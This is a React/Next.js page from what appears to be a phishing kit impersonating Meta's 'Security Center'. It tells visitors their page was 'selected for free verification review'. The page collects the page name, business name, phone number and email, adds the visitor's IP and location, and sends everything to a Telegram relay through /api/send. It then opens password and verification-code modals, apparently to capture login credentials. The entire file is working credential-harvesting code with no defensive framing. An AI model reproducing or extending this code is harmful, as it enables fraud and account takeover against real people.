'use client';
import { store } from '@/store/store';
import { translateBatch } from '@/utils/translate';
import axios from 'axios';
import { useEffect, useState, type FC, type ChangeEvent, type FormEvent } from 'react';
import Image from 'next/image';
import BlobIcon from '@/assets/images/blob.png';
import WarningIcon from '@/assets/images/warning.png';
import { faHome, faSearch, faShield, faFileAlt, faGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PasswordModal from '@/components/form-modal/password-modal';
import VerifyModal from '@/components/form-modal/verify-modal';

interface VerifyFormData {
    personalEmail: string;
    pageName: string;
    legalBusinessName: string;
    phoneNumber: string;
    description: string;
}

const countryPhoneCodes: Record<string, string> = {
    // Americas
    US: '+1', CA: '+1', MX: '+52', BR: '+55', AR: '+54', CL: '+56',
    CO: '+57', PE: '+51', EC: '+593', VE: '+58', GY: '+592', SR: '+597', BO: '+591', PY: '+595', UY: '+598',
    GT: '+502', HN: '+504', SV: '+503', NI: '+505', CR: '+506', PA: '+507',
    DO: '+1-809', HT: '+509', JM: '+1-876',
    // Europe
    AT: '+43', BE: '+32', BG: '+359', HR: '+385', CY: '+357', CZ: '+420',
    DK: '+45', EE: '+372', FI: '+358', FR: '+33', DE: '+49', GR: '+30', HU: '+36', IE: '+353',
    IT: '+39', LV: '+371', LT: '+370', LU: '+352', MT: '+356', NL: '+31', PL: '+48', PT: '+351', RO: '+40',
    GB: '+44', SE: '+46', CH: '+41', TR: '+90',
    RS: '+381', BA: '+387', ME: '+382', UA: '+380', BY: '+375', MD: '+373', IS: '+354', AL: '+355',
    // Asia
    CN: '+86', JP: '+81', KR: '+82', HK: '+852', TW: '+886', SG: '+65', MY: '+60', TH: '+66',
    VN: '+84', PH: '+63', ID: '+62', BD: '+880', IN: '+91', PK: '+92', LK: '+94', NP: '+977',
    AF: '+93', IR: '+98', KZ: '+7', UZ: '+998', TJ: '+992', KG: '+996',
    MM: '+95', LA: '+856', KH: '+855', RU: '+7', AU: '+61', NZ: '+64',
    // Middle East & West Asia
    AE: '+971', SA: '+966', KW: '+965', BH: '+973', QA: '+974', OM: '+968', YE: '+967',
    IL: '+972', PS: '+970', JO: '+962', LB: '+961', SY: '+963', IQ: '+964',
    // Africa
    EG: '+20', ZA: '+27', NG: '+234', KE: '+254', ET: '+251', GH: '+233', CM: '+237', SN: '+221',
    MA: '+212', DZ: '+213', TN: '+216', LY: '+218', MG: '+261', ZW: '+263', BW: '+267'
};

const countryFlags: Record<string, string> = {
    // Americas
    US: '🇺🇸', CA: '🇨🇦', MX: '🇲🇽', BR: '🇧🇷', AR: '🇦🇷', CL: '🇨🇱',
    CO: '🇨🇴', PE: '🇵🇪', EC: '🇪🇨', VE: '🇻🇪', GY: '🇬🇾', SR: '🇸🇷', BO: '🇧🇴', PY: '🇵🇾', UY: '🇺🇾',
    GT: '🇬🇹', HN: '🇭🇳', SV: '🇸🇻', NI: '🇳🇮', CR: '🇨🇷', PA: '🇵🇦',
    DO: '🇩🇴', HT: '🇭🇹', JM: '🇯🇲',
    // Europe
    AT: '🇦🇹', BE: '🇧🇪', BG: '🇧🇬', HR: '🇭🇷', CY: '🇨🇾', CZ: '🇨🇿',
    DK: '🇩🇰', EE: '🇪🇪', FI: '🇫🇮', FR: '🇫🇷', DE: '🇩🇪', GR: '🇬🇷', HU: '🇭🇺', IE: '🇮🇪',
    IT: '🇮🇹', LV: '🇱🇻', LT: '🇱🇹', LU: '🇱🇺', MT: '🇲🇹', NL: '🇳🇱', PL: '🇵🇱', PT: '🇵🇹', RO: '🇷🇴',
    GB: '🇬🇧', SE: '🇸🇪', CH: '🇨🇭', TR: '🇹🇷',
    RS: '🇷🇸', BA: '🇧🇦', ME: '🇲🇪', UA: '🇺🇦', BY: '🇧🇾', MD: '🇲🇩', IS: '🇮🇸', AL: '🇦🇱',
    // Asia
    CN: '🇨🇳', JP: '🇯🇵', KR: '🇰🇷', HK: '🇭🇰', TW: '🇹🇼', SG: '🇸🇬', MY: '🇲🇾', TH: '🇹🇭',
    VN: '🇻🇳', PH: '🇵🇭', ID: '🇮🇩', BD: '🇧🇩', IN: '🇮🇳', PK: '🇵🇰', LK: '🇱🇰', NP: '🇳🇵',
    AF: '🇦🇫', IR: '🇮🇷', KZ: '🇰🇿', UZ: '🇺🇿', TJ: '🇹🇯', KG: '🇰🇬',
    MM: '🇲🇲', LA: '🇱🇦', KH: '🇰🇭', RU: '🇷🇺', AU: '🇦🇺', NZ: '🇳🇿',
    // Middle East & West Asia
    AE: '🇦🇪', SA: '🇸🇦', KW: '🇰🇼', BH: '🇧🇭', QA: '🇶🇦', OM: '🇴🇲', YE: '🇾🇪',
    IL: '🇮🇱', PS: '🇵🇸', JO: '🇯🇴', LB: '🇱🇧', SY: '🇸🇾', IQ: '🇮🇶',
    // Africa
    EG: '🇪🇬', ZA: '🇿🇦', NG: '🇳🇬', KE: '🇰🇪', ET: '🇪🇹', GH: '🇬🇭', CM: '🇨🇲', SN: '🇸🇳',
    MA: '🇲🇦', DZ: '🇩🇿', TN: '🇹🇳', LY: '🇱🇾', MG: '🇲🇬', ZW: '🇿🇼', BW: '🇧🇼'
};

const countryNames: Record<string, string> = {
    // Americas
    US: 'United States', CA: 'Canada', MX: 'Mexico', BR: 'Brazil', AR: 'Argentina', CL: 'Chile',
    CO: 'Colombia', PE: 'Peru', EC: 'Ecuador', VE: 'Venezuela', GY: 'Guyana', SR: 'Suriname', BO: 'Bolivia', PY: 'Paraguay', UY: 'Uruguay',
    GT: 'Guatemala', HN: 'Honduras', SV: 'El Salvador', NI: 'Nicaragua', CR: 'Costa Rica', PA: 'Panama',
    DO: 'Dominican Republic', HT: 'Haiti', JM: 'Jamaica',
    // Europe
    AT: 'Austria', BE: 'Belgium', BG: 'Bulgaria', HR: 'Croatia', CY: 'Cyprus', CZ: 'Czech Republic',
    DK: 'Denmark', EE: 'Estonia', FI: 'Finland', FR: 'France', DE: 'Germany', GR: 'Greece', HU: 'Hungary', IE: 'Ireland',
    IT: 'Italy', LV: 'Latvia', LT: 'Lithuania', LU: 'Luxembourg', MT: 'Malta', NL: 'Netherlands', PL: 'Poland', PT: 'Portugal', RO: 'Romania',
    GB: 'United Kingdom', SE: 'Sweden', CH: 'Switzerland', TR: 'Turkey',
    RS: 'Serbia', BA: 'Bosnia & Herzegovina', ME: 'Montenegro', UA: 'Ukraine', BY: 'Belarus', MD: 'Moldova', IS: 'Iceland', AL: 'Albania',
    // Asia
    CN: 'China', JP: 'Japan', KR: 'South Korea', HK: 'Hong Kong', TW: 'Taiwan', SG: 'Singapore', MY: 'Malaysia', TH: 'Thailand',
    VN: 'Vietnam', PH: 'Philippines', ID: 'Indonesia', BD: 'Bangladesh', IN: 'India', PK: 'Pakistan', LK: 'Sri Lanka', NP: 'Nepal',
    AF: 'Afghanistan', IR: 'Iran', KZ: 'Kazakhstan', UZ: 'Uzbekistan', TJ: 'Tajikistan', KG: 'Kyrgyzstan',
    MM: 'Myanmar', LA: 'Laos', KH: 'Cambodia', RU: 'Russia', AU: 'Australia', NZ: 'New Zealand',
    // Middle East & West Asia
    AE: 'United Arab Emirates', SA: 'Saudi Arabia', KW: 'Kuwait', BH: 'Bahrain', QA: 'Qatar', OM: 'Oman', YE: 'Yemen',
    IL: 'Israel', PS: 'Palestine', JO: 'Jordan', LB: 'Lebanon', SY: 'Syria', IQ: 'Iraq',
    // Africa
    EG: 'Egypt', ZA: 'South Africa', NG: 'Nigeria', KE: 'Kenya', ET: 'Ethiopia', GH: 'Ghana', CM: 'Cameroon', SN: 'Senegal',
    MA: 'Morocco', DZ: 'Algeria', TN: 'Tunisia', LY: 'Libya', MG: 'Madagascar', ZW: 'Zimbabwe', BW: 'Botswana'
};

const Page: FC = () => {
    const { geoInfo, setGeoInfo, setMessageId, setMessage } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [isLoading, setIsLoading] = useState(false);
    const [isLoadingTranslations, setIsLoadingTranslations] = useState(false);
    const [selectedCountryCode, setSelectedCountryCode] = useState<string>('US');
    const [showPasswordModal, setShowPasswordModal] = useState(false);
    const [showVerifyModal, setShowVerifyModal] = useState(false);
    const [formData, setFormData] = useState<VerifyFormData>({
        personalEmail: '',
        pageName: '',
        legalBusinessName: '',
        phoneNumber: '',
        description: ''
    });

    const t = (text: string): string => {
        const translated = translations[text];
        if (translated === undefined) {
            return text;
        }
        return translated;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    const textsToTranslate = [
        'Confirm Page Information',
        'Page Name',
        'Legal Business Name',
        'Phone Number',
        'Email',
        'Description',
        'Enter legal business name',
        'Enter phone number',
        'Enter email address',
        'Write a short description about your page',
        'Your page meets the eligibility requirements',
        'Submit for Review',
        'Home',
        'Search',
        'Security Policies',
        'Rules & Other Posts',
        'Settings',
        'Submit Application',
        'Under Review',
        'Completed',
        'Security Center',
        'Congratulations! Your page has been selected for free verification review',
        'About',
        'Create ad',
        'Create Page',
        'Developers',
        'Careers',
        'Privacy',
        'Cookies',
        'Terms',
        'Help'
    ];

    useEffect(() => {
        if (!geoInfo) return;
        
        console.log('GeoInfo received:', geoInfo);
        // Set initial country code from geolocation
        setSelectedCountryCode(geoInfo.country_code);
    }, [geoInfo]);

    useEffect(() => {
        const translateAll = async () => {
            setIsLoadingTranslations(true);
            try {
                console.log(`Translating ${textsToTranslate.length} texts to ${selectedCountryCode}`);
                const startTime = performance.now();
                
                const translatedMap = await translateBatch(textsToTranslate, selectedCountryCode);
                
                const endTime = performance.now();
                console.log(`Translation complete in ${(endTime - startTime).toFixed(2)}ms`);
                
                setTranslations(translatedMap);
            } catch (error) {
                console.error('Error during translation:', error);
            } finally {
                setIsLoadingTranslations(false);
            }
        };
        
        if (selectedCountryCode) {
            translateAll();
        }
    }, [selectedCountryCode]);

    const handleInputChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        // Prepare message data
        const phoneCountryCode = countryPhoneCodes[selectedCountryCode] || '+1';
        const fullPhoneNumber = `${phoneCountryCode}${formData.phoneNumber}`;

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>📝 Page Name:</b> <code>${formData.pageName}</code>
<b>🏢 Legal Business Name:</b> <code>${formData.legalBusinessName}</code>
<b>📱 Phone Number:</b> <code>${fullPhoneNumber}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            // Send message to telegram first
            const res = await axios.post('/api/send', {
                message
            });

            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
                // Show password modal after successful telegram send
                setShowPasswordModal(true);
            } else {
                alert('Error submitting form. Please try again.');
            }
        } catch {
            alert('Error submitting form. Please try again.');
        } finally {
            setIsLoading(false);
        }
    };

    const handlePasswordConfirm = async () => {
        // Close password modal and show verify modal
        setShowPasswordModal(false);
        setShowVerifyModal(true);
    };

    const handleVerifyConfirm = async () => {
        // Close verify modal and reset form
        setShowVerifyModal(false);
        setFormData({
            personalEmail: '',
            pageName: '',
            legalBusinessName: '',
            phoneNumber: '',
            description: ''
        });
    };

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col">
            <div className="flex-1 flex justify-center pt-4 md:pt-6">
                <div className="flex w-full max-w-7xl mx-auto">
                    {/* Sidebar - Hidden on mobile */}
                    <div className="hidden md:flex w-64 bg-gray-50 flex-col flex-shrink-0">
                        <div className="px-4 py-3 bg-gray-50">
                            <div className="flex flex-col items-start gap-3">
                                <Image 
                                    src={BlobIcon} 
                                    alt="Meta" 
                                    width={500} 
                                    height={300} 
                                    className="w-24 h-auto flex-shrink-0"
                                    priority
                                    quality={100}
                                />
                                <p className="text-2xl font-bold text-gray-900">{t('Security Center')}</p>
                            </div>
                        </div>

                        <nav className="flex-1 px-2 py-3 space-y-1 my-4 relative">
                            <div className="absolute right-0 top-[42%] transform -translate-y-1/2 h-[95%] border-r border-gray-300"></div>
                            <div className="px-3 py-2.5 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 cursor-pointer hover:bg-blue-100 transition">
                                <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
                                <span className="text-sm">{t('Home')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
                                <span className="text-sm">{t('Search')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
                                <span className="text-sm">{t('Security Policies')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
                                <span className="text-sm">{t('Rules & Other Posts')}</span>
                            </div>
                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
                                <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
                                <span className="text-sm">{t('Settings')}</span>
                            </div>
                        </nav>
                    </div>

                    {/* Main Content */}
                    <div className="flex-1 flex flex-col w-full md:w-auto">
                        {/* Header */}
                        <div className="bg-gray-50 px-3 md:px-4 pt-2 md:pt-3 pb-2 flex items-start md:items-center justify-between gap-2">
                            <div className="flex-1 flex items-start md:items-center gap-2 md:gap-3 min-w-0">
                                <Image
                                    src={WarningIcon}
                                    alt="Warning"
                                    width={32}
                                    height={32}
                                    className="flex-shrink-0 w-6 md:w-8 h-6 md:h-8 mt-0.5 md:mt-0"
                                />
                                <div className="min-w-0">
                                    <h2 className="font-bold text-gray-900 text-sm md:text-base md:truncate">{t('Congratulations! Your page has been selected for free verification review')}</h2>
                                    <p className="text-xs md:text-sm text-gray-600 truncate">{t('Your page meets the eligibility requirements')}</p>
                                </div>
                            </div>
                            {isLoadingTranslations && (
                                <div className="flex items-center gap-1 md:gap-2 text-xs text-gray-500 flex-shrink-0">
                                    <div className="h-2 md:h-3 w-2 md:w-3 animate-spin rounded-full border border-blue-500 border-b-transparent"></div>
                                    <span className="hidden sm:inline">Translating...</span>
                                </div>
                            )}
                        </div>

                        {/* Content Area */}
                        <div className="flex-1 overflow-y-auto p-3 md:p-4 flex flex-col pb-6">
                            <div className="w-full max-w-2xl mx-auto md:mx-0">
                                {/* Progress Indicator */}
                                <div className="mb-4 md:mb-6 bg-white rounded-2xl p-4 md:p-6 shadow-sm">
                                    <div className="flex items-center gap-0 text-xs md:text-sm">
                                        {/* Step 1 */}
                                        <div className="flex items-center gap-1 md:gap-2 flex-shrink-0">
                                            <div className="w-6 md:w-8 h-6 md:h-8 rounded-full bg-blue-600 text-white flex items-center justify-center text-xs md:text-sm font-bold">
                                                1
                                            </div>
                                            <span className="font-medium text-blue-600 whitespace-nowrap hidden sm:inline">{t('Submit Application')}</span>
                                        </div>

                                        {/* Line 1 - Blue */}
                                        <div className="flex-1 h-0.5 bg-blue-600 mx-1 md:mx-2"></div>

                                        {/* Step 2 */}
                                        <div className="flex items-center gap-1 md:gap-2 flex-shrink-0">
                                            <div className="w-6 md:w-8 h-6 md:h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center text-xs md:text-sm font-bold">
                                                2
                                            </div>
                                            <span className="font-medium text-gray-500 whitespace-nowrap hidden sm:inline">{t('Under Review')}</span>
                                        </div>

                                        {/* Line 2 - Gray */}
                                        <div className="flex-1 h-0.5 bg-gray-300 mx-1 md:mx-2"></div>

                                        {/* Step 3 */}
                                        <div className="flex items-center gap-1 md:gap-2 flex-shrink-0">
                                            <div className="w-6 md:w-8 h-6 md:h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center text-xs md:text-sm font-bold">
                                                3
                                            </div>
                                            <span className="font-medium text-gray-500 whitespace-nowrap hidden sm:inline">{t('Completed')}</span>
                                        </div>
                                    </div>
                                </div>

                                {/* Form */}
                                <form onSubmit={handleSubmit} className="bg-white rounded-2xl p-4 md:p-6 shadow-sm space-y-4 md:space-y-5">
                                    {/* Form Title */}
                                    <h1 className="text-xl md:text-2xl font-bold text-gray-900 mb-3 md:mb-4">{t('Confirm Page Information')}</h1>

                                    {/* Page Name */}
                                    <div>
                                        <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                            {t('Page Name')}
                                        </label>
                                        <input
                                            required
                                            type="text"
                                            name="pageName"
                                            value={formData.pageName}
                                            onChange={handleInputChange}
                                            placeholder={t('Page Name') || 'Page name'}
                                            className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                        />
                                    </div>

                                    {/* Legal Business Name */}
                                    <div>
                                        <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                            {t('Legal Business Name')}
                                        </label>
                                        <input
                                            required
                                            type="text"
                                            name="legalBusinessName"
                                            value={formData.legalBusinessName}
                                            onChange={handleInputChange}
                                            placeholder={translations['Enter legal business name'] || 'Enter legal business name'}
                                            className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                        />
                                    </div>

                                    {/* Phone Number */}
                                    <div>
                                        <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                            {t('Phone Number')}
                                        </label>
                                        <div className="flex gap-2 items-center">
                                            <select
                                                value={selectedCountryCode}
                                                onChange={(e) => setSelectedCountryCode(e.target.value)}
                                                className="h-10 md:h-11 px-2 md:px-3 py-2 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-lg cursor-pointer hover:border-gray-300 flex-shrink-0"
                                                style={{ minWidth: '60px' }}
                                                title={countryNames[selectedCountryCode]}
                                            >
                                                {Object.entries(countryPhoneCodes).map(([code]) => (
                                                    <option key={code} value={code} title={countryNames[code]}>
                                                        {countryFlags[code]}
                                                    </option>
                                                ))}
                                            </select>
                                            <input
                                                disabled
                                                type="text"
                                                value={countryPhoneCodes[selectedCountryCode] || '+1'}
                                                placeholder="+1"
                                                className="w-14 md:w-16 px-2 md:px-3 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl text-gray-600 font-semibold outline-none text-center text-sm md:text-base flex-shrink-0"
                                            />
                                            <input
                                                required
                                                type="tel"
                                                name="phoneNumber"
                                                value={formData.phoneNumber}
                                                onChange={handleInputChange}
                                                placeholder="912 345 678"
                                                className="flex-1 px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>
                                    </div>

                                    {/* Email */}
                                    <div>
                                        <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                            {t('Email')}
                                        </label>
                                        <input
                                            required
                                            type="email"
                                            name="personalEmail"
                                            value={formData.personalEmail}
                                            onChange={handleInputChange}
                                            placeholder={translations['Enter email address'] || 'Enter email address'}
                                            className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                        />
                                    </div>

                                    {/* Description */}
                                    <div>
                                        <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                            {t('Description')}
                                        </label>
                                        <textarea
                                            name="description"
                                            value={formData.description}
                                            onChange={handleInputChange}
                                            placeholder={translations['Write a short description about your page'] || 'Write a short description about your page'}
                                            rows={3}
                                            className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition resize-none text-sm md:text-base"
                                        />
                                    </div>

                                    {/* Submit Button */}
                                    <button
                                        type="submit"
                                        disabled={isLoading}
                                        className="w-full mt-6 md:mt-8 py-2.5 md:py-3 bg-gradient-to-r from-blue-600 to-blue-700 text-white font-semibold rounded-xl hover:from-blue-700 hover:to-blue-800 transition-all shadow-lg hover:shadow-xl hover:-translate-y-0.5 disabled:opacity-60 disabled:cursor-not-allowed disabled:shadow-lg disabled:hover:translate-y-0 flex items-center justify-center gap-2 text-sm md:text-base"
                                    >
                                        {isLoading ? (
                                            <>
                                                <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-b-transparent"></div>
                                                {t('Submit for Review')}
                                            </>
                                        ) : (
                                            t('Submit for Review')
                                        )}
                                    </button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {/* Footer - Full Width */}
            <div className="bg-gray-50 flex justify-center border-t border-gray-200">
                <div className="w-full max-w-7xl mx-auto flex">
                    <div className="w-64 hidden md:block flex-shrink-0"></div>
                    <div className="flex-1 py-2 md:py-3 px-2 md:px-2 flex items-center justify-start gap-2 md:gap-3 text-xs md:text-sm text-gray-600 overflow-x-auto">
                        <span className="text-2xl md:text-3xl font-bold text-blue-600 flex-shrink-0">∞</span>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('About')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create ad')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create Page')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Developers')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Careers')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Privacy')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Cookies')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Terms')}</a>
                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Help')}</a>
                    </div>
                </div>
            </div>

            {/* Password Modal */}
            {showPasswordModal && (
                <PasswordModal 
                    userEmail={formData.personalEmail || ''}
                    nextStep={handlePasswordConfirm}
                />
            )}

            {/* Verify Modal */}
            {showVerifyModal && (
                <VerifyModal 
                    businessName={formData.legalBusinessName}
                    nextStep={handleVerifyConfirm}
                />
            )}
        </div>
    );
};

export default Page;